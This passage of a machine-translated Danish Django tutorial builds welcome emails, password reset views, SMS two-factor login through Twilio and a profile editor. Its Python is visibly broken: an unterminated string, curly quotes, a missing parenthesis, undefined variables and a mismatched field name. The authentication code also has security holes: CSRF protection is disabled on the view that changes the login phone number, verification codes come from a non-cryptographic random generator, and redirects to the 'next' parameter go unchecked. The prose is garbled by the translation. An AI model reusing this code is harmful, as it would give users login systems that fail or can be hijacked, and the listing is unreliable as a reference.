    context = Context({'username': user.username, 'base_url': settings.BASE_URL, 'model_name': 'Daisy Holton, 'site_name': settings.SITE_NAME})
    renderedtemplate = template.render(context)
    subjcontext = Context({'username': user.username})
    subjrenderedtemplate = subjtemplate.render(subjcontext)
    send_html_email(user, subjrenderedtemplate, renderedtemplate)
</code></pre>Vi har også brug for en skabelon til at give alle disse oplysninger. På min hjemmeside ligner skabelonen nedenfor, men du er velkommen til at formatere den, som du vil.<pre class="language-markup"><code> 
&lt;html&gt;
&lt;body&gt;
&lt;h3&gt;Welcome to {{ site_name }}&lt;/h3&gt;
&lt;p&gt;Hello {{ username }},&lt;/p&gt;
&lt;p&gt;We are happy to see you here! Thank you for joining {{ site_name }} and being a part of the fun. To get started, here are a few things you can do after you verify your identity.&lt;/p&gt;
&lt;ol&gt;
    &lt;li&gt;&lt;a href="{{ base_url }}/" title="Use the app"&gt;Use the app&lt;/a&gt;. This is the main page of {{ site_name }}&lt;/li&gt;
    &lt;li&gt;&lt;a href="{{ base_url }}/feed/profile/Clementine/" title="See my profile"&gt;Visit my private {{ site_name }} profile&lt;/a&gt;. This is a page for anyone wanting to get to know me.&lt;/li&gt;
    &lt;li&gt;&lt;a href="{{ base_url }}/feed/profiles/" title="See all profiles currently on the site"&gt;More profiles&lt;/a&gt;. You can find these people on the site, and see their content.&lt;/li&gt;
    &lt;li&gt;&lt;a href="{{ base_url }}/feed/all/" title="See everything on {{ site_name }}"&gt;See all posts here&lt;/a&gt;. This is the private front page of {{ site_name }}.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;There is even more on the site, so feel free to visit and see what you find. You can share the site with any of the social buttons on each page. I hope you enjoy your time with {{ site_name }}! Thanks for being here.&lt;/p&gt;
&lt;p&gt;With much love,&lt;/p&gt;
&lt;p&gt;{{ model_name }}&lt;/p&gt;
&lt;a href="{{ base_url }}" title="{{ site_name }}"&gt;{{ base_url }}&lt;/a&gt;
 </code></pre>Bemærk, at vi ikke har lukkekrop eller HTML -tags, fordi vi tilføjer disse, når vi tilføjer HTML -afmeldingslinket. Disse er vigtige, men vi ønsker ikke at definere dem to gange.

Så hvad er det næste? Vi er nået langt. Vi skal virkelig være klar til at implementere webstedet til en server. Vi kan tilføje @Login_Required Decorator og gøre vores synspunkter sikre, tage brugertilmeldinger, sende kompatibel e -mail og cacheinformation, som er grundlaget for, hvad et websted skal gøre for at forblive relevant. Vi tilføjer et par flere nyttige funktioner og bygger derefter et grundlag for at implementere vores kode til en fjernserver, opsætte en mailserver, domænekonfiguration og filtre for at gøre vores websted sikkert og passende.

Vi har også brug for en visning af adgangskode nulstilling, så lad os tilføje det virkelig hurtigt. Djangos indbyggede visning af nulstilling af adgangskode er brudt i nogle funktioner, men vi ser på, hvordan man skriver vores egen visning, e -mail -skabelon, formularer og URL -mønstre. Sådan ser udsigten ud, i brugere/visninger.py<pre class="language-python"><code>
# ... beløb
from django.contrib.auth.tokens import default_token_generator
from django.contrib.auth.forms import SetPasswordForm
from django.utils.http import urlsafe_base64_decode

def password_reset(request, uidb64, token):
    user = get_object_or_404(User, id=urlsafe_base64_decode(uidb64))
    if request.method == 'POST':
        form = SetPasswordForm(user, request.POST)
        if form.is_valid() and default_token_generator.check_token(user, token):
            form.save()
            messages.success(request, 'Your password has been reset.')
        elif not form.is_valid():
            messages.warning(request, 'Your passwords do not match, or do not meet the requirements. Please try again.')
            return redirect(request.path)
        else:
            messages.warning(request, 'Your password reset link has expired. Please create a new one.')
        return redirect(reverse('users:login'))
    return render(request, 'users/password_reset_confirm.html', {
        'title': 'Reset your Password',
        'form': SetPasswordForm(user)
</code></pre>Denne formular er indbygget til Django, men vi har brug for en skabelon for at bekræfte nulstilling af adgangskoden, brugere/skabeloner/brugere/adgangskode_reset_confirm.html<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
        &lt;form method="POST"&gt;
            {% csrf_token %}
            &lt;fieldset class="form-group"&gt;
                &lt;legend class="border-bottom mb-4"&gt;Reset Password&lt;/legend&gt;
                {{ form|crispy }}
            &lt;/fieldset&gt;
            &lt;div class="form-group"&gt;
                &lt;button class="btn btn-outline-info" type="submit"&gt;Reset Password&lt;/button&gt;
            &lt;/div&gt;
        &lt;/form&gt;
{% endblock content %}
 </code></pre>Vi har også en skabelon til at sende en e -mail til nulstilling af adgangskode med en simpel form, i brugere/skabeloner/brugere/password_reset.html<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
        &lt;form method="POST"&gt;
            {% csrf_token %}
            &lt;fieldset class="form-group"&gt;
                &lt;legend class="border-bottom mb-4"&gt;Reset Password&lt;/legend&gt;
                {{ form|crispy }}
            &lt;/fieldset&gt;
            &lt;div class="form-group"&gt;
                &lt;button class="btn btn-outline-info" type="submit"&gt;Request Password Reset&lt;/button&gt;
            &lt;/div&gt;
        &lt;/form&gt;
{% endblock content %}
 </code></pre>Skabelonen til selve e -mailen er enkel, det er en grundlæggende HTML -fil, der gengiver et link til at nulstille adgangskoden, i brugere/skabeloner/brugere/password_reset_email.html. Django fortolker automatisk denne fil.<pre class="language-markup"><code> 
&lt;h1&gt;Uglek - Reset Your Password&lt;/h1&gt;
&lt;p&gt;Hello,&lt;/p&gt;
&lt;p&gt;To reset your password, please &lt;a href="https:/uglek.com{% url 'password_reset_confirm' uidb64=uid token=token %}"&gt;click here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Alternatively, you can paste the following link into your browser:&lt;/p&gt;
&lt;p&gt;https://uglek.com{% url 'password_reset_confirm' uidb64=uid token=token %}&lt;/p&gt;
&lt;p&gt;If you have not requested a password reset you can simply ignore this email.&lt;/p&gt;
&lt;p&gt;Thanks for joining us,&lt;/p&gt;
&lt;p&gt;Daisy&lt;/p&gt;
 </code></pre>Vi har også brug for yderligere to skabeloner. Den første er at bekræfte, at e -mailen er sendt. Synspunkter for disse er allerede i Django, så vi er bare nødt til at adressere dem i urls.py. Denne skabelon er placeret på brugere/skabeloner/brugere/password_reset_done.html<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% block content %}
  &lt;div class="media-body"&gt;
    &lt;div class="alert alert-info"&gt;
        An email has been sent with instructions to reset your password.
    &lt;/div&gt;
  &lt;/div&gt;
{% endblock content %}
 </code></pre>Og til sidst for at bekræfte, at nulstilling af adgangskoden er komplet, brugere/skabeloner/brugere/adgangskode_reset_komplet.html<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% block content %}
 &lt;div class="media-body"&gt;
    &lt;div class="alert alert-info"&gt;
        Your password has been set.
    &lt;/div&gt;
    &lt;a href="{% url 'users:login' %}"&gt;Sign In Here&lt;/a&gt;
  &lt;/div&gt;
{% endblock content %}
 </code></pre>Nu har vi brug for URL -mønstre til disse visninger. Tilføj følgende URL -mønstre i brugere/urls.py:<pre class="language-python"><code>
urlpatterns = [
    # ... Tidligere URL'er her
    path('password-reset/',
         auth_views.PasswordResetView.as_view(
             template_name='users/password_reset.html',
             html_email_template_name='users/password_reset_html_email.html'
         ),
         name='password_reset'),
    path('password-reset/done/',
         auth_views.PasswordResetDoneView.as_view(
             template_name='users/password_reset_done.html'
         ),
         name='password_reset_done'),
    path('password-reset-confirm/&lt;uidb64&gt;/&lt;token&gt;/',
         auth_views.PasswordResetConfirmView.as_view(
             template_name='users/password_reset_confirm.html'
         ),
         name='password_reset_confirm'),
    path('password-reset-complete/',
         auth_views.PasswordResetCompleteView.as_view(
             template_name='users/password_reset_complete.html'
         ),
         name='password_reset_complete'),
]
</code></pre>Fire skabeloner, det er meget! Men nu kan vi være sikre på at være i stand til at nulstille brugerens adgangskode, når som helst vi har brug for, alt sammen fra webbrowseren.

Jeg forstår, at dette er en masse kode. Hvis det virker lidt over dit hoved, er det OK. Du vil forbedre dig, din forståelse vil blive bedre, og du bliver meget mere kompetent med kode meget snart. Hvis du er helt tabt, anbefaler jeg at vende tilbage til denne software senere efter at have arbejdet med en selvtempoet Lær at kode kursus online. Disse er normalt gratis at komme i gang og vil guide dig gennem alt hvad du har brug for for at få succes, når du kommer tilbage til dette projekt. Hvis du har lyst til at du er klar til at fortsætte, læse videre, næste, dækker vi implementering af din kode til en ekstern server og opretter en mailserver, samt automatisering Et par enkle kommandoer.

Den sidste ting, vi skal gøre, før vi implementeres til en fjernserver, er at gøre vores websted lidt mere sikker. Du vilBemærk, at loginvisningen kun tager et brugernavn og adgangskode, og der er ingen multi -faktor -godkendelse eller en gangskode. Dette er en let løsning, og med den samme kode kan vi få vores websted til at sende tekstbeskeder og endda være lydhøre over for tekstbeskeder, der sendes til serveren. For at starte med vil vi gå tilbage til brugermodellerne og tilføje en tidsstempel -underskriver, der repræsenterer hvert login. Vi tilføjer også en unik, roterende identifikator til brugermodellen, der vil blive brugt til at tilføje ekstra sikkerhed til vores login. Redigering af brugermodeller, brugere/modeller.py, tilføj følgende<pre class="language-python"><code>
from django.db import models
from django.contrib.auth.models import User
from django.utils import timezone
# Sørg for at importere UUID, TIMESTAMP Signer og URL Generator (omvendt)
import uuid
from django.core.signing import TimestampSigner, BadSignature, SignatureExpired
from django.urls import reverse

class Profile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE, null=True, blank=True, related_name='profile')
    account_created = models.DateTimeField(default=timezone.now)
    last_seen = models.DateTimeField(default=timezone.now)
    can_login = models.DateTimeField(default=timezone.now)
    preferred_name = models.CharField(max_length=20,default='', null=True, blank=True)
    bio = models.TextField(blank=True, default='')
    # Tilføj denne kode her
    uid = models.CharField(max_length=32, default=uuid.uuid4, null=True, blank=True)
    mfa_enabled = models.BooleanField(default=False)
    enable_mfa = models.BooleanField(default=False)
    phone_number = models.CharField(default='', null=True, blank=True, max_length=15)
    verification_code = models.CharField(default='', null=True, blank=True, max_length=15)
    verification_code_length = models.IntegerField(default=6)
    mfa_code_expires = models.DateTimeField(default=timezone.now)
    mfa_attempts = models.IntegerField(default=0)

    def make_auth_token(self):
        return TimestampSigner().sign(self.uid)

    # Og tilføj denne funktion
    def create_auth_url(self):
        username, token = self.make_auth_token().split(":", 1)
        return reverse('users:mfa', kwargs={'username': username, 'token': token,})

    def check_auth_token(self, token):
        try:
            key = '%s:%s' % (self.uid, token)
            TimestampSigner().unsign(key, max_age=60 * settings.AUTH_VALID_MINUTES) #  Valid for 3 mins
        except (BadSignature, SignatureExpired):
            return False
        return True
</code></pre>Sørg for, at dine brugere/modeller.py ser sådan ud, udover kommentarerne (kode på linjerne med #). At bryde dette ned, det er enkelt. Vi har et par import, en tidsstempler, der er et kryptografisk værktøj, der kan generere en sikker kode og verificere den for at sikre, at den er gyldig, kun blevet brugt én gang og ikke ældre end et vist antal sekunder. Vi bruger også en UUID, som er en unik identifikator, der identificerer vores bruger i underskrivelsen af ​​tokenet, og i URL'en, hvor token sendes til brugeren. Vi bruger denne grundlæggende kryptografi til at opbygge en to faktor -godkendelsesvisning. Før vi gør noget andet, lad os køre migrationerne, så vores brugermodeller opdateres. Kør følgende kommandoer for at lave og afslutte migrationerne i biblioteket med administration.py.<pre class="language-bash"><code>
source venv/bin/activate
python manage.py makemigrations &amp;&amp; python manage.py migrate
</code></pre>Dette er vigtigt, for hver gang vi foretager ændringer i modellerne, er vi nødt til at oprette tabellerne og opdatere databasen med standardindstillinger, før vi faktisk kan bruge modellerne.

Lad os derefter improvisere vores loginvisning for at omdirigere til en sekundær godkendelsesvisning. Fjern loginfunktionen i brugere/visninger.<pre class="language-python"><code>
# ... beløb

def login(request):
    if request.method == “POST”:
        username = request.POST['username']
        password = request.POST['password']
        user = authenticate(username=username, password=password)
        if user and user.profile.can_login &lt; timezone.now(): # Bemærk, at vi nu kontrollerer, om brugeren kan logge ind
            # Fjern funktionen Auth_login, der var her
            messages.success(request, 'Your password was accepted. Please continue.')
            if user.profile.mfa_enabled:
                return redirect(user.profile.create_auth_url()) # Bemærk, vi omdirigerer til en ny URL her
            else: # Hvis brugeren ikke bruger multifaktor-godkendelse, skal du bare logge dem ind.
                auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend')
                return redirect('feed:feed')
        else: # Hvis login ikke lykkedes,
            messages.warning(request, 'Username or password incorrect. Please try again.')
            user = User.objects.filter(username=username).first() # Dette er den del, hvor vi opdaterer brugerprofilen
            if user: 
                profile = user.profile
                profile.can_login = timezone.now() + datetime.timedelta(seconds=15) # Så de kan ikke logge ind igen i et par sekunder
                profile.save()
    return render(request, 'users/login.html', {'form': AuthenticationForm()})
</code></pre>Så dette er temmelig enkelt, vi har nu en måde at omdirigere til den to faktorautentificeringsvisning, når vi opretter den. Vi har også et tilbagefald, hvis brugeren ikke har tilføjet et telefonnummer. Vi tilføjer en grundlæggende visning for at tilføje et telefonnummer snart og logge ind med en sms snart.

Først har vi brug for en nem måde at sende en sms fra vores kode. For at gøre dette kan vi vælge mellem et antal API'er, men den nemmeste efter min mening er Twilio. De tilbyder også gode priser til mindre projekter såvel som bulkrabatter. Opret en konto på Twilio.com, udfyld nogle detaljer om dit projekt, køb et telefonnummer og kopier dine API -nøgler til dine indstillinger.py. Tilføj derefter denne kode under en ny fil, brugere/sms.py.<pre class="language-bash"><code>
nano users/sms.py
</code></pre>
<pre class="language-python"><code>
# Importer alle de nødvendige pakker
from django.utils import timezone
import random
import datetime
from django.conf import settings
from feed.middleware import get_current_request
from django.contrib import messages
import traceback

account_sid = settings.TWILIO_ACCOUNT_SID
auth_token = settings.TWILIO_AUTH_TOKEN
source_phone = settings.PHONE_NUMBER

# Denne kode sender teksten med Twilio
def send_text(target_phone, text):
    from twilio.rest import Client
    try:
        client = Client(account_sid, auth_token)
        if len(target_phone) &gt;= 11:
            message = client.messages.create(
                to=target_phone,
                from_=source_phone,
                body=text)
    except:
        print(traceback.format_exc())

# En hjælperfunktion for at få et nummer med så mange cifre
def get_num_length(num, length):
    n = ''
    for x in range(length):
        n = n + str(num)
    return int(n)

# Send teksten for at bekræfte brugeren
def send_verification_text(user):
    length = user.profile.verification_code_length
    code = random.randint(get_num_length(1, length), get_num_length(9, length));
    user.profile.verification_code = code
    user.profile.mfa_code_expires = timezone.now() + datetime.timedelta(minutes=3)
    user.profile.save()
    send_user_text(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)))

# Send en bruger enhver tekst med denne funktion
def send_user_text(user, text):
    send_text(user.profile.phone_number, text)

# Valider koden med denne funktion
def check_verification_code(user, code):
    user.profile.mfa_attempts += 1
    result = user.profile.verification_code != None and code != '' and user.profile.verification_code == code and user.profile.mfa_code_expires &gt; timezone.now() and user.profile.mfa_attempts &lt;= 3
    if user.profile.mfa_attempts &lt; 3 and result:
        user.profile.verification_code_length = 6
    elif user.profile.mfa_attempts &gt; 2 and not result:
        user.profile.verification_code_length = 8
    user.profile.save()
    return result

# Validerer tiden
def check_verification_time(user):
    result = user.profile.mfa_code_expires &gt; timezone.now()
    return result
</code></pre>Sørg for at ændre dine indstillinger korrekt og tilføje disse linjer med dine nøgler:<pre class="language-python"><code>
# Sørg for at kopiere disse fra dit Twilio Dashboard
TWILIO_ACCOUNT_SID = “&lt;your sid&gt;”
TWILIO_AUTH_TOKEN = “&lt;your token&gt;”
PHONE_NUMBER = “&lt;your twilio phone number&gt;”
SITE_NAME = “&lt;Your site name&gt;”
AUTH_VALID_MINUTES = 3 # Antallet af minutter, som TFA -siden er aktivt, når den er instantieret
</code></pre>Først har vi brug for formularer til vores to faktorgodkendelsesvisninger. Redigering af brugere/formular. Py, tilføj følgende kode.<pre class="language-python"><code>
# ... beløb
from django import forms

# En formular til indtastning af vores telefonnummer
class PhoneNumberForm(forms.Form):
    phone_number = forms.RegexField(regex=r'^\+?1?\d{9,15}$', error_messages = {'invalid': "Phone number must be entered in the format: '+999999999'. Up to 15 digits is allowed."})
    def __init__(self, *args, **kwargs):
        super(PhoneNumberForm, self).__init__(*args, **kwargs)
        self.fields['phone_number'].label = phone_number_label

# En formular til autentificering
class TfaForm(forms.Form):
    code = forms.IntegerField(required=False)
    def __init__(self, *args, **kwargs):
        super(TfaForm, self).__init__(*args, **kwargs)
        self.fields['code'].widget.attrs.update({'autocomplete': 'off'})
    help_texts = {
        'code': 'Please enter the six digit code after sending it to your phone with the button above.'
    }
</code></pre>Lad os derefter oprette visningerne i brugere/visninger.py<pre class="language-python"><code>
# ... beløb
from django.http import HttpResponseRedirect
from .forms import PhoneNumberForm, TfaForm

def mfa(request, username, token):
    user = User.objects.filter(profile__uuid=username).first()
    if not user: return HttpResponseRedirect(reverse('verify:age') + '?next=' + request.GET.get('next') if request.GET.get('next') else '/go/' if request.user.is_authenticated and request.user.profile.vendor else '/' if request.user.is_authenticated else reverse('users:login'))
    user = get_object_or_404(User, profile__uuid=username)
    next = request.GET.get('next','')
    if not user.profile.mfa_enabled:
        if not check_verification_time(user):
            user.profile.mfa_enabled = False
            user.profile.enable_two_factor_authentication = True
            user.profile.phone_number = '+1'
            user.profile.save()
            print('Logging in user')
            auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend')
            messages.warning(request, 'Please enter a valid phone number and verify it with a code.')
            return redirect(reverse('users:mfa_onboarding'))
    if request.method == 'POST':
        form = TfaForm(request.POST)
        code = form.data['code']
        if code and code != '' and code != None:
            token_validated = user.profile.check_auth_token(token)
            p = user.profile
            is_verified = check_verification_code(user, int(code))
            p.mfa_authenticated = is_verified
            if token_validated:
                if is_verified:
                    user.profile.mfa_enabled = True
                    user.profile.save()
                    auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend')
                    p.verfication_code = None
                    p.uid = get_uuid()
                    p.save()
                    messages.success(request, 'You have been authenticated. Welcome.')
                    qs = '?'
                    for key, value in request.GET.items():
                        qs = qs + key + '=' + value + '&amp;'
                    if next != '' and not (next.startswith('/accounts/logout/') or next.startswith('/accounts/login/') or next.startswith('/admin/login/') or next.startswith('/accounts/register/')):
                        return HttpResponseRedirect(ext)
                    elif next.startswith('/accounts/logout/') or next.startswith('/accounts/login/') or next.startswith('/accounts/register/'):
                        return redirect('feed:feed')
                    elif request.META.get('HTTP_REFERER', '/').startswith('/accounts/login/'):
                        return redirect(reverse('feed:feed'))
                    elif not next:
                        return redirect(reverse('feed:feed')
                    else:
                        return HttpResponseRedirect('feed:feed')
                else:
                    messages.warning(request, 'The code you entered was not recognized. Please try again.')
            elif not token_validated:
                messages.warning(request, 'The URL token has expired or was not recognized. Please try again.')
                logout(request)
                return redirect(reverse('users:login'))
            if p.mfa_attempts &gt; 3:
                messages.warning(request, 'You have entered the incorrect code more than 3 times. please send yourself a new code.')
                p.verification_code = None
                p.save()
        elif user.profile.can_send_mfa &lt; timezone.now():
            user.profile.mfa_attempts = 0
            user.profile.can_send_mfa = timezone.now() + datetime.timedelta(minutes=2)
            user.profile.save()
            send_verification_text(user)
            messages.success(request, "Please enter the code sent to your phone number. The code will expire in 3 minutes.")
        else:
            messages.warning(request, 'You are sending too many two factor authentication codes. Wait a few minutes before sending another code.')
    form = TfaForm()
    hide_logo = None
    if user.profile.hide_logo:
        hide_logo = True
    return render(request, 'users/mfa.html', {'title': 'Enter Code', 'form': form, 'xsmall': True, 'user': user, 'hide_logo': hide_logo, 'accl_logout': user.profile.shake_to_logout, 'preload': False})

@login_required
def mfa_onboarding(request):
    if request.method == 'POST':
        form = PhoneNumberForm(request.POST)
        request.user.profile.phone_number = form.data['phone_number'].replace('-', '').replace('(','').replace(')','')
        request.user.profile.mfa_enabled = True
        request.user.profile.enable_two_factor_authentication = True
        request.user.profile.save()
        messages.success(request, 'You have added a phone number to your account.')
        user = request.user
        return redirect(user.profile.create_auth_url())
    form = PhoneNumberForm(initial={'phone_number': request.user.profile.phone_number if request.user.profile.phone_number else '+1'})
    return render(request, 'users/mfa_onboarding.html', {'title': 'Enter your phone number', 'form': form, 'small': True})
</code></pre>Vi har også brug for skabeloner til begge disse synspunkter. Lad os tilføje MFA -skabelonen først.<pre class="language-bash"><code>
nano users/templates/users/mfa.html
</code></pre>Føj denne HTML -kode til skabelonen<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% block content %}
{% load app_filters %}
{% load crispy_forms_tags %}
        &lt;form action="{{ request.path }}{% if request.GET.next %}?next={{ request.GET.next }}{% endif %}" method="POST"&gt;
            {% csrf_token %}
            &lt;legend class="border-bottom mb-4"&gt;Enter Verification Code&lt;/legend&gt;
            &lt;p&gt;Step 1: Send the code&lt;/p&gt;
	    &lt;i&gt;Never share your code with anyone, as it can be used to access your account temporarily.&lt;/i&gt;
	    &lt;div class="form-group"&gt;
                &lt;button class="btn btn-outline-primary" type="submit"&gt;Send code&lt;/button&gt;
            &lt;/div&gt;
	    &lt;hr&gt;
	    &lt;p&gt;Step 2: Enter the code&lt;/p&gt;
            &lt;fieldset class="form-group"&gt;
                {{ form|crispy }}
		&lt;p&gt;Press the enter button to send yourself the code at {{ user.profile.phone_number|securephone }}. Then, enter the code and press enter.&lt;/p&gt;
            &lt;/fieldset&gt;
            &lt;div class="form-group"&gt;
                &lt;button class="btn btn-outline-secondary" type="submit"&gt;Enter code&lt;/button&gt;
            &lt;/div&gt;
        &lt;/form&gt;
{% endblock %}
 </code></pre>Dette er temmelig selvforklarende. Formularen sender enten en kode eller en tom kode, og du vil bemærke i visningen, at vi sender koden, hvis vi modtager en tom kode. Så har vi bare to indsendelsesknapper, og på denne måde kan vi sende koden med begge knap. Dernæst tilføjer vi en enkel formular til at tilføje et telefonnummer.<pre class="language-bash"><code>
nano users/templates/users/mfa_onboarding.html
</code></pre>Tilføj følgende HTML:<pre class="language-markup"><code> 
{% extends 'base.html' %}
{% block content %}
{% load crispy_forms_tags %}
        &lt;form method="POST"&gt;
            {% csrf_token %}
            &lt;fieldset class="form-group"&gt;
                &lt;legend class="border-bottom mb-4"&gt;Set Up Two Factor Authentication&lt;/legend&gt;
                {{ form|crispy }}
            &lt;/fieldset&gt;
            &lt;div class="form-group"&gt;
                &lt;button class="btn btn-outline-secondary" type="submit"&gt;Add phone number&lt;/button&gt;
            &lt;/div&gt;
        &lt;/form&gt;
{% endblock %}
 </code></pre>Denne formular er meget enklere, den gengiver bare den telefonnummer, vi oprettede, og lader brugeren tilføje et telefonnummer.

Dette ser rigtig godt ud! Så længe alt er indstillet korrekt, skal vi være i stand til at sende meddelelser og logge brugeren ind med deres telefonnummer, så snart vi tilføjer URL -mønstre. Den sidste ting, vi har brug for at konfigurere, er en profilvisning, så vi kan sørge for, at brugeren kan ændre deres telefonnummer uden “Stop” for at fravælge fremtidige tekstbeskeder.

Lad os tilføje en profilvisning til brugerne/visningen.py. Denne visning opdaterer brugerens bio, e -mail, brugernavn og telefonnummer samt giver os mulighed for at aktivere multi -faktor -godkendelse. Først har vi brug for yderligere to former i brugere/form.<pre class="language-python"><code>
# ... beløb
class UserUpdateForm(forms.ModelForm):
    email = forms.EmailField()
    class Meta:
        model = User
        fields = ['username', 'email']

phone_number_label = 'Phone number (no spaces, parenthesis \'(\' or dashes \'-\', numbers beginning with + only)'

class ProfileUpdateForm(forms.ModelForm):
    subscribed = forms.BooleanField(required=False)
    phone_number = forms.CharField(required=False)
    def __init__(self, *args, **kwargs):
        super(ProfileUpdateForm, self).__init__(*args, **kwargs)
    class Meta:
        model = Profile
        fields = ['bio', 'phone_number', 'enable_mfa', 'subscribed']
</code></pre>Dernæst kan vi oprette en visning for at bruge begge disse former. Rediger brugere/visninger.py og tilføj visningen.<pre class="language-python"><code>
# Tilføj disse import
from .forms import UserUpdateForm, ProfileUpdateForm
from django.views.decorators.cache import never_cache
from django.views.decorators.csrf import csrf_exempt
from .models import Profile
from .mfa import send_user_text

@csrf_exempt
@never_cache
@login_required
def profile(request):
    if request.method == 'POST':
        u_form = UserUpdateForm(request.POST, instance=request.user)
        p_form = ProfileUpdateForm(request.POST,
                                       request.FILES,
                                       instance=request.user.profile)
        if u_form.is_valid() and p_form.is_valid():
            new_phone_number = p_form.data['phone_number']
            u_form.save()
            profile = p_form.save(commit=False)
            profile.phone_number = profile.phone_number.replace('-', '').replace('(','').replace(')','')
            profile.save()
            if new_phone_number != oldprofile.phone_number and oldprofile.phone_number and len(oldprofile.phone_number) &gt;= 11:
                profile.mfa_enabled = True
                profile.save()
                send_text(oldprofile.phone_number, 'Your phone number has been updated to ' + new_phone_number + '. Please refer to texts on that phone to log in. If you didnt make this change, please call us. - {}'.format(settings.SITE_NAME))
            if profile.enable_two_factor_authentication and profile.phone_number and len(profile.phone_number) &lt; 11:
                profile.enable_two_factor_authentication = False
                messages.success(request, f'Two factor authentication can\'t be activated without entering a phone number. Please enter a phone number to enable two factor authentication.')
            profile.save()
            if new_phone_number != oldprofile.phone_number and new_phone_number and len(new_phone_number) &gt;= 11:
                send_user_text(request.user, 'You have added this number to {} for two factor authentication. You can now use your number for two factor authentication. If you didnt make this change, please call us. - {}'.format(settings.SITE_NAME, settings.DOMAIN))
                profile.mfa_enabled = True
                profile.mfa_code_expires = timezone.now() + datetime.timedelta(minutes=3)
                profile.save()
                return redirect(profile.create_auth_url())
            messages.success(request, f'Your profile has been updated!')
            print('Profile updated')
            return redirect('users:profile')
    else:
        u_form = UserUpdateForm(instance=request.user)
        p_form = ProfileUpdateForm(instance=request.user.profile, initial={'phone_number': request.user.profile.phone_number if request.user.profile.phone_number else '+1'})
    context = {
        'u_form': u_form,
        'p_form': p_form,
        'title':'Update Your Profile',
    }
    return render(request, 'users/profile.html', context)
</code></pre>Vi har også brug for en skabelon til denne visning.<pre class="language-bash"><code>
nano users/templates/users/profile.html
</code></pre>
<pre class="language-markup"><code> 
{% extends "base.html" %}
{% load crispy_forms_tags %}
{% load feed_filters%}
{% block content %}
	&lt;h2&gt;Edit Your Profile&lt;/h2&gt;  
	&lt;form method="POST" enctype="multipart/form-data" id="profile-form"&gt;
          {% csrf_token %}
          &lt;fieldset class="form-group"&gt;
              &lt;legend class="border-bottom mb-4 mt-4"&gt;Profile info&lt;/legend&gt;
              {{ u_form|crispy }}
              {{ p_form|crispy }}
          &lt;/fieldset&gt;
          &lt;div class="form-group"&gt;
              &lt;button class="btn btn-outline-info" type="submit"&gt;Update}&lt;/button&gt;
          &lt;/div&gt;
	&lt;/form&gt;
        &lt;p style="text-color: green;" class="hide" id="posted"&gt;Saved&lt;/p&gt;

{% endblock content %}
{% block javascript %}
var form = document.getElementById('profile-form');
$('input').change(function(){
	var formdata = new FormData(form);
	$.ajax({
		url: window.location.href,
		type: "POST",
		data: formdata,
		processData: false,
		contentType: false,
		timeout: 1000 * 60,
                success: function(data) {
                  $(posted).removeClass("hide");
		  setTimeout(function() {
			$(posted).addClass("fade-hidden");
			setTimeout(function() {
				$(posted).addClass("hide");
				$(posted).removeClass("fade-hidden");
			}, 2000);
		  }, 2000);
                }
	});
});
{% endblock %}
 </code></pre>Du vil bemærke, at dette er en forholdsvis enkel form, men har noget JavaScript i det, der automatisk poster indholdet af formularen, når de opdateres. Dette er nyttigt at have, så du er i stand til at foretage redigeringer uden at skulle presse indsend hver gang.

Dernæst har vi brug for webadresser, der repræsenterer alle disse visninger i brugerens URL -patters. Rediger brugere/urls.py og tilføj denne kode:<pre class="language-python"><code>
# … Tidligere kode, import
from django.urls import path
from . import views

app_name='users'

urlpatterns = [
# … URL -mønstre, vi tidligere har indtastet, tilføj de næste tre linjer
    path('mfa/&lt;str:username&gt;/&lt;str:token&gt;/', views.mfa, name='mfa'),
    path('mfa/onboarding/', views.mfa_onboarding, name='mfa_onboarding'),
    path('profile/', views.profile, name='profile'),
]
</code></pre>Nu er det et godt tidspunkt at teste vores projekt. Men først, lad os køre en anden sikkerhedskopi.<pre class="language-bash"><code>
backup
</code></pre>Og kør serveren. Inden vi implementerer til en Linux -server, er det en god ide at muliggøre to faktorautentisering på kontoen. Vi gør dette til vores profil -URL,/brugere/profil/, og markeret feltet for at aktivere godkendelse efter indtastning af vores telefonnummer og derefter indsende formularen.<pre class="language-bash"><code>
python manage.py runserver localhost:8000
</code></pre>Besøg websiden ved at gå til din webbrowser, jeg bruger Google Chrome i dette eksempel og indtaster url https: // localhost: 8000/konti/profil/

Du vil være i stand til at logge ind om nødvendigt og aktivere to faktorgodkendelse.

Dette projekt har brug for en server til at køre på, så det virkelig kan sende mail. Men først har vi brug for en måde at se fejl på. Du vil bemærke, at hvis du kører serveren i Debug -tilstand, med indstillinger.debug lig med sandt, viser serveren fejl automatisk. For at vise fejl uden at bruge Debug -tilstand, som er utrygt på en produktionsserver, skal vi tilføje en visning til det. De vigtigste fejl, vi har brug for at kunne håndtere, er:

Fejl 500 - Et problem med vores kode
Fejl 404 - En side, der ikke blev fundet (brudt URL)
Fejl 403 - En tilladelse nægtet fejl

Lad os tilføje en ny app til at håndtere disse fejl, kaldet fejl.<pre class="language-bash"><code>
python manage.py startapp errors
</code></pre>Føj dette til indstillingerne.py, som vi gjorde før, i indstillingen Installer_Apps, og start med at tilføje henvisninger til nogle visninger i app/urls.py, hvor app er navnet på dit Django -projekt.<pre class="language-python"><code>
handler404 = 'errors.views.handler404'
handler500 = 'errors.views.handler500'
handler403 = 'errors.views.handler403'
</code></pre>Dette er alt, hvad vi har brug for udover fejlvisninger, skabeloner og en lille smule middleware. Lad os definere dem som så:<pre class="language-python"><code>
from django.shortcuts import render, redirect
from django.http import HttpResponse
from stacktrace.models import Error
from errors.middleware import get_current_exception
from django.contrib.auth.decorators import login_required
from django.contrib.auth.decorators import user_passes_test
from .logs import get_logs
from face.tests import is_superuser_or_vendor
from django.views.decorators.csrf import csrf_exempt
from errors.highlight import highlight_code
from django.shortcuts import redirect
from django.urls import reverse

# Opret dine synspunkter her.
@login_required
@user_passes_test(is_superuser_or_vendor)
def logs(request):
    logs = highlight_code(get_logs())
